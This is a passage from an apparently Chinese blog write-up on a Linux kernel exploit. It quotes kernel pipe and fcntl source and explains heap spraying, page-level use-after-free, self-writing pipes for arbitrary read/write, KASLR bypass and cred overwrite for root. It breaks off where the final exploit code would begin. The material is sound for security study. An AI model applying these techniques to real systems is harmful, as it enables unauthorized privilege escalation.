<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">do_pipe2<br>	__do_pipe_flags<br>		create_pipe_files<br>			get_pipe_inode 			<span class="hljs-comment">//对于该管道inode的fops赋值为pipefifo_fops</span><br>				<span class="hljs-function">alloc_pipe_info</span><br><span class="hljs-function">					<span class="hljs-title">kzalloc</span><span class="hljs-params">(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT)</span></span><br><span class="hljs-function">					<span class="hljs-title">kcalloc</span><span class="hljs-params">(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer), GFP_KERNEL_ACCOUNT)</span></span><br></code></pre></td></tr></table></figure>

<p>该链条会导致pipe_buffer从kmalloc-cg-1k当中获取，其中pipe_bufs在函数开头被指定为一个常数16，且pipe_buffer结构体的大小为0x28,这俩相乘了分配得<code>512&lt;0x280&lt;0x400</code>,因此他会从kmalloc-cg-1k、order-2当中取得</p>
<p>所以这里我们考虑其他的方式来修改我们pipe_buffer的大小</p>
<p>要改这个kcalloc中pipe_bufs的大小，在pipe系统调用的过程中是万不可行，但是我们可以利用到fcntl这样一个系统调用，我们可以来稍微查看一下其中的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(fcntl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg)<br>&#123;	<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_raw(fd);<br>	<span class="hljs-type">long</span> err = -EBADF;<br><br>	<span class="hljs-keyword">if</span> (!f.file)<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">if</span> (unlikely(f.file-&gt;f_mode &amp; FMODE_PATH)) &#123;<br>		<span class="hljs-keyword">if</span> (!check_fcntl_cmd(cmd))<br>			<span class="hljs-keyword">goto</span> out1;<br>	&#125;<br><br>	err = security_file_fcntl(f.file, cmd, arg);<br>	<span class="hljs-keyword">if</span> (!err)<br>		err = do_fcntl(fd, cmd, arg, f.file);<br><br>out1:<br> 	fdput(f);<br>out:<br>	<span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_fcntl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>	<span class="hljs-type">void</span> __user *argp = (<span class="hljs-type">void</span> __user *)arg;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flock</span> <span class="hljs-title">flock</span>;</span><br>	<span class="hljs-type">long</span> err = -EINVAL;<br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>	...<br>		<span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>		<span class="hljs-keyword">case</span> F_GETPIPE_SZ:<br>		err = pipe_fcntl(filp, cmd, arg);<br>		<span class="hljs-keyword">break</span>;<br>		<br>	...<br>	<br>		<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> err;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>通过cmd指令<code>F_SETPIPE_SZ</code>,我们可以调用pipe_fcntl这样一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>	<span class="hljs-type">long</span> ret;<br>	<br>	<br>	...<br><br>	<span class="hljs-keyword">switch</span> (cmd) &#123;<br>	<span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>		ret = pipe_set_size(pipe, arg);<br>		<span class="hljs-keyword">break</span>;<br>		...<br>	&#125;<br><br>	__pipe_unlock(pipe);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用pipe_set_size，这个函数对我们的诱惑极大，光函数名即可猜测其中我们可以设置pipe_buffer的大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配一个pipe_buffer的新数组（也就是调用了kcalloc) 并且把以往的数据复制到上面. </span><br><span class="hljs-comment"> * 如果成功则返回大小, 错误则返回-ERROR .</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots, size;<br>	<span class="hljs-type">long</span> ret = <span class="hljs-number">0</span>;<br><br>	size = round_pipe_size(arg);<br>	nr_slots = size &gt;&gt; PAGE_SHIFT;<br><br>	...<br>        <br>	ret = pipe_resize_ring(pipe, nr_slots);<br>	...<br>        <br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里调用pipe_resize_ring来重新分配pipe_buffer</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Resize the pipe ring to a number of slots.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br>	...<br>	<br>	bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br>	...<br>	kfree(pipe-&gt;bufs);<br>	pipe-&gt;bufs = bufs;<br>	pipe-&gt;ring_size = nr_slots;<br>	<span class="hljs-keyword">if</span> (pipe-&gt;max_usage &gt; nr_slots)<br>		pipe-&gt;max_usage = nr_slots;<br>	pipe-&gt;tail = tail;<br>	pipe-&gt;head = head;<br><br>	<span class="hljs-comment">/* This might have made more room for writers */</span><br>	wake_up_interruptible(&amp;pipe-&gt;wr_wait);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，我们此时传入的nr_slots若为64，也就是之前的4倍，那么总共分配得大小为<code>2k&lt;0xA00&lt;4k</code>我们便可以将我们的pipe_buffer从kmalloc-cg-4k当中分配，就可以和我们之前的legacy_data进行互动</p>
<h3 id="2-任意地址读-x2F-写"><a href="#2-任意地址读-x2F-写" class="headerlink" title="2.任意地址读&#x2F;写"></a>2.任意地址读&#x2F;写</h3><p>接下来我们将从单字节的溢出，直到实现任意地址读写</p>
<h4 id="step-I：构造1级UAF"><a href="#step-I：构造1级UAF" class="headerlink" title="step I：构造1级UAF"></a>step I：构造1级UAF</h4><p>我们首先大量堆喷pipe,这是为了之后我们重复分配提供条件，</p>
<p>然后我们同之前基地址泄露类似，堆喷msg_msg,然后我们就可以利用溢出来将msg_msg的m_ts字段覆盖为一个大值来进行越界读，会成为下面这种情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e4345d95209c2d56285356844.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这样我们就可以再次通过任意写再来覆盖相邻的msg_msg的下一个msg_msg，且刚好溢出一个空子节</p>
<p>（为什么不直接溢出legacy_fs_context的相邻msg_msg呢，这是因为我们由于需要创造一个漏洞的整数溢出，所以在我们溢出的第一个相邻msg_msg的时候必定会写入一个<code>=</code>和<code>\x00</code>，因此我们选则溢出到下一个4k页面）</p>
<p>而本次我们利用到的结构体为pipe_buffer，根据上面我们的初期知识准备知道，我们可以通过fcntl来修改pipe_buffer的大小，我们将其改为一次分配64个buffer，也就是64*0x28大小，该堆块刚好也是从order-3来分配，因此我们可以通过释放掉msg_msg接着利用fcntl重分配pipe_buffer来构造溢出条件</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd526684c54b26ed18972bd4073611.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这样我们继续写入legacy_data，直到恰好使得我们（broken）msg_msg下一个相邻pipe_buffer的page指针低1字节为<code>\x00</code></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/b7fd5266d0160924fdc1d529920735fae6cd341f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这样我们大概率就可以构造出两个pipe_buffer同时指向同一个page,情况如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/1b4c510fd9f9d72aa7b0672f922a2834349bbb28.jpg" srcset="/img/loading.gif" lazyload></p>
<h4 id="step-II：构造二级UAF"><a href="#step-II：构造二级UAF" class="headerlink" title="step II：构造二级UAF"></a>step II：构造二级UAF</h4><p>此时我们如果释放掉其中一个pipe,那么我们就会释放掉该page对应的物理页面，因此就构成了一个UAF，此时我们若再次分配pipe_buffer，我们就会从刚释放掉的4k obj当中分配，就构成如下情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/91ef76c6a7efce1b98efbff8e951f3deb48f653f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>此时我们可以再次构造一个UAF，这里构造的目的主要是为了任意修改之后的页面，然后我们再次重复上次的操作，再次重分配pipe_buffer如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f6030f80ea757f12b31bb051edd4.jpg" srcset="/img/loading.gif" lazyload></p>
<h4 id="step-III：构造自写管道"><a href="#step-III：构造自写管道" class="headerlink" title="step III：构造自写管道"></a>step III：构造自写管道</h4><p>这里我们已知将目前二级UAF所指向的页面分配了多个pipe_buffer，此时我们将其中的一个pipe_buffer指向上一级，也就是自身物理页面所对应的struct page，如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd11317e7c1001cafa40f4bfb05dd.jpg" srcset="/img/loading.gif" lazyload></p>
<p>此时我们的最后一级pipe_buffer就可以往自身存在的页面进行写入了</p>
<h4 id="step-IV：构造任意读写系统"><a href="#step-IV：构造任意读写系统" class="headerlink" title="step IV：构造任意读写系统"></a>step IV：构造任意读写系统</h4><p>我们目前可以写入自身的页面，看起来好像跟任意读写没什么关联，但接下来构造的读写系统才算是精妙所在</p>
<p>首先我们同时构建三个上述的自写管道</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8b13632762d0f70335aee3ee4efa513d2697c5e0.jpg" srcset="/img/loading.gif" lazyload></p>
<p>当同时在一个page内存在三个自写管道时，我们就可以通过不断修改他们之间的offset&#x2F;len字段来达成重复的利用读&#x2F;写，其中各个管道的功能如下</p>
<ul>
<li>管道1用来在任意内存中进行读&#x2F;写</li>
<li>管道2用来修正复原我们的管道3</li>
<li>管道3用来修改我们的管道1和恢复我们的管道2</li>
</ul>
<p>通过上面三个自写管道我们就可以达成任意地址读写，这个系统可能在讲述时不好理解，这里需要对于其中的代码以及pipe_buffer的布局了解透彻才想的清楚，但是想清楚之后是十分顺畅的~</p>
<h3 id="3-地址泄漏和权限提升"><a href="#3-地址泄漏和权限提升" class="headerlink" title="3.地址泄漏和权限提升"></a>3.地址泄漏和权限提升</h3><p>我们知道page对于物理地址页面的映射是线性的，而struct page数据结构体数组存放在vmemmap区域</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8644ebf81a4c510f18d391282659252dd42aa5e9.jpg" srcset="/img/loading.gif" lazyload></p>
<p>因此若我们知道了vmemmap_base基地址，则可以读写数组当中所有的物理页面</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br></code></pre></td></tr></table></figure>

<p>而KASLR的粒度是256MB，所以根据上面构造自写管道的过程我们得到了一个page结构体的地址，通过它可以得出一个可能正确的vmemmap_base，也就是将低28位取0即可</p>
<p>这里说可能的原因也是因为当我们的内存大于16GB的时候，那么我们pages数组的大小便会大于(0x400000000&#x2F;0x1000)*0x40&#x3D; 0x10000000,此时就刚好超过KASLR的粒度，所以我们直接取0是一个可能的值，因此还需要判断一下获取到的vmemmap_base的正确性</p>
<p>至于正确性的判断，在实模式当中我们需要用到一个写入的汇编函数<code>secondary_startup_64</code>，该函数被应用到linux内核的启动过程中，且在物理内存偏移0x9d000的地方会存放该函数的一个指针，（这里固定的原因我猜可能是在由于实模式下直接使用物理地址，所以就直接将其存放在固定的位置拿来使用）</p>
<p>我们同样可以将内核用objdump进行查看也可以看到该函数，就刚好处于开头这一部分</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f6031f6dfa757f12b31bb051ed27.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到他的一个地址是在内核text代码段偏移0x30的地址，因此我们使用这个点来进行检测</p>
<p>通过上述方法，我们即可得到内核基地址，此时我们还需要知道我们的page_offset_base,也就是我们physmap所对应的虚拟地址，此时用到task_struct中的一个字段ptraced,该字段在我们的进程没有被附加的时候会指向其自身，且该地址位于我们的physmap当中</p>
<p>当我们知道了physmap线性映射区的基地址，那么我们就可以知道某个虚拟地址所对应的page结构体，因此就达成了真正意义上的任意地址读写，此时我们可以利用它来找到我们本进程的task_struct（寻找的方式就是利用prctl函数的PR_SET_NAME来修改进程taskt_struct的comm字段，使用它来做一个标记，然后在页面寻找），然后通过其中的parent字段向上寻找，也就是不断找寻父进程，直到找到最终的init进程，但是我个人在调试过程中发现最终找到的是swapper进程，其pid为0，init进程pid为1，但是这并不影响最终我们的提权</p>
<p>最终我们只需要将init&#x2F;swapper进程的cred字段的地址赋值给当前进程的cred字段即可达成提权，效果如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/aa64034f78f0f736e8e013334c55b319ebc413e1.jpg" srcset="/img/loading.gif" lazyload></p>
<p>最终的exploit如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 